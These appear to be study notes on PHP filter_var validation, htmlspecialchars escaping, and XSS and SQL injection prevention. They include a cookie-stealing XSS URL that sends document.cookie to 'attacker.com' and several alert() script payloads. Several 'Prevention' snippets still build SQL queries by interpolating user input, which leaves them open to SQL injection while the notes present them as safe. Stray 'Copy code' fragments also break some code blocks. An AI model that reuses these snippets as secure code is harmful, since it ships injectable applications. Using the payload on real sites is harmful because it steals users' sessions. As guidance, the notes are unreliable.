#PHP 

### PHP Filters are used for validating and sanitizing external input

![[data validating]]

![[data sanitizing]]

The `filter_list()` function can be used to list what the PHP filter extension offers:
```php
<table>  
  <tr>  
    <td>Filter Name</td>  
    <td>Filter ID</td>  
  </tr>  
  <?php  
  foreach (filter_list() as $id =>$filter) {  
    echo '<tr><td>' . $filter . '</td><td>' . filter_id($filter) . '</td></tr>';  
  }  
  ?>  
</table>
```

## PHP filter_var() Function

The `filter_var()` function both validate and sanitize data.

The `filter_var()` function filters a single variable with a specified filter. 
**Parameters**
It takes two pieces of data:
- The variable you want to check
- The type of check to use

## validate integer
```php
<?php  
$int = 100;  
  
if (!filter_var($int, FILTER_VALIDATE_INT) === false) {  
  echo("Integer is valid");  
} else {  
  echo("Integer is not valid");  
}  
?>
```


### filter_var() and Problem With 0

In the example above, if $int was set to 0, the function above will return "Integer is not valid". To solve this problem, use the code below:
```php
<?php  
$int = 0;  
  
if (filter_var($int, FILTER_VALIDATE_INT) === 0 || !filter_var($int, FILTER_VALIDATE_INT) === false) {  
  echo("Integer is valid");  
} else {  
  echo("Integer is not valid");  
}  
?>
```

### validate an integer within a range
//This script uses filter_var() to check if a variable is both of type INT, and between 1 and 200
```php
<?php  
$int = 122;  
$min = 1;  
$max = 200;  
  
if (filter_var($int, FILTER_VALIDATE_INT, array("options" => array("min_range"=>$min, "max_range"=>$max))) === false) {  
  echo("Variable value is not within the legal range");  
} else {  
  echo("Variable value is within the legal range");  
}  
?>
```

## Validate an IP Address
```php
<?php  
$ip = "127.0.0.1";  
  
if (!filter_var($ip, FILTER_VALIDATE_IP) === false) {  
  echo("$ip is a valid IP address");  
} else {  
  echo("$ip is not a valid IP address");  
}  
?>
```

## Sanitizing user input for display
Let's say you want to display a user's name on a webpage. To prevent XSS attacks, you should sanitize the input before outputting it.
```php
$name = $_POST['name'];
// Sanitize the input to prevent XS 
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
echo "Hello, " . $safe_name . "!";
```
### The `htmlspecialchars()` function:
>[!Tip]
>Use `htmlspecialchars()` only when displaying data to browser. Do not use it before storing external input to db.

**Purpose:** `htmlspecialchars()` is used to escape HTML characters in a string, preventing potential [[XSS attack]]s when outputting the string in an HTML context.
```php
$name = $_POST['name'];
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```
This function is typically used when you want to display user input on a webpage to ensure that special characters (like `<`, `>`, `&`, etc.) are displayed as text rather than being interpreted as HTML or JavaScript.
**Example:**
```php
$name = $_POST['name'];
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```


## Sanitize and Validate an Email Address

```php
$email = $_POST['email'];

// Validate email
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    // Sanitize and store
    $sanitized_email = filter_var($email, FILTER_SANITIZE_EMAIL);
    // Store $sanitized_email in the database
} else {
    echo "Invalid email format.";
}
```



## Potential risks and prevention of xss and sql injection attacks

### **1. User Input in Forms**

Suppose you have a comment section on your website where users can post comments. If the input is not properly validated and sanitized, an attacker could inject a script.

#### **Example:**


```php
$comment = $_POST['comment']; 
echo "User Comment: " . $comment;
```

- **Potential Attack:** If an attacker submits the following as a comment:
    
```js
<script>alert('XSS Attack!');</script>
```

Without validation and sanitization, the script will be executed in the user's browser when the comment is displayed, causing a popup alert.
    
- **Prevention:** Sanitize the input using `htmlspecialchars()` to convert the special characters into HTML entities:

    ```php
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');

echo "User Comment: " . $comment;    
```

    This converts `<script>` to `&lt;script&gt;`, preventing the script from being executed.
### **2. URL Parameters**

If your application uses URL parameters to display content and does not validate or sanitize the input, an attacker can inject malicious code through the URL.

#### **Example:**
```php
$username = $_GET['username']; 
echo "Welcome, " . $username;
```
- **Potential Attack:** An attacker could craft a URL like this:

    
    `http://example.com?username=<script>document.location='http://attacker.com?cookie='+document.cookie</script>`
    
    This would cause the script to execute and send the user's cookies to the attacker's server.
    
- **Prevention:** Sanitize the input using `htmlspecialchars()`:
    
    php
    
    Copy code
    
    `$username = htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8'); echo "Welcome, " . $username;`
    
    This prevents the script from executing by converting the `<` and `>` characters.
    

### **3. Stored Data (Database)**

If user input is stored in a database without sanitization, it can be retrieved and executed later when displayed.

#### **Example:**

Imagine a profile page where users can enter their bio:

php

Copy code

`$bio = $_POST['bio']; // Insert into the database $sql = "INSERT INTO profiles (bio) VALUES ('$bio')"; mysqli_query($conn, $sql);`

- **Potential Attack:** If an attacker submits:
    
    html
    
    Copy code
    
    `<script>alert('XSS via Stored Data!');</script>`
    
    This script gets stored in the database. When another user views the profile page, the script will execute.
    
- **Prevention:** Before storing the bio in the database, sanitize it:
    
    php
    
    Copy code
    
    `$bio = htmlspecialchars($_POST['bio'], ENT_QUOTES, 'UTF-8'); // Insert sanitized bio into the database $sql = "INSERT INTO profiles (bio) VALUES ('$bio')"; mysqli_query($conn, $sql);`
    
    This ensures that the script is stored as text and not executable code.
    

### **4. Dynamic Content Displayed from Database**

If your site displays dynamic content fetched from the database without sanitization, an attacker could inject malicious code during data entry.

#### **Example:**

A website that displays user names from a database:

php

Copy code

`$sql = "SELECT username FROM users"; $result = mysqli_query($conn, $sql); while ($row = mysqli_fetch_assoc($result)) {     echo "User: " . $row['username'] . "<br>"; }`

- **Potential Attack:** If an attacker manages to store a script in the `username` field:
    
    html
    
    Copy code
    
    `<script>alert('XSS from Database!');</script>`
    
    The script will execute each time the username is displayed.
    
- **Prevention:** Sanitize the output when displaying it:
    
    php
    
    Copy code
    
    `echo "User: " . htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8') . "<br>";`
    
    This ensures that even if the script is stored in the database, it will not execute when displayed.
    

### **5. User Profile Updates**

If users can update their profiles, including fields like "About Me" or "Location," and these fields are not sanitized, they could inject malicious scripts.

#### **Example:**

php

Copy code

`$location = $_POST['location']; // Save location to the database $sql = "UPDATE users SET location='$location' WHERE id='$user_id'"; mysqli_query($conn, $sql);`

- **Potential Attack:** The attacker could update their location to:
    
    html
    
    Copy code
    
    `<script>alert('XSS via Profile Update!');</script>`
    
    When their profile is viewed, the script runs.
    
- **Prevention:** Sanitize the input before saving it:
    
    php
    
    Copy code
    
    `$location = htmlspecialchars($_POST['location'], ENT_QUOTES, 'UTF-8'); $sql = "UPDATE users SET location='$location' WHERE id='$user_id'"; mysqli_query($conn, $sql);`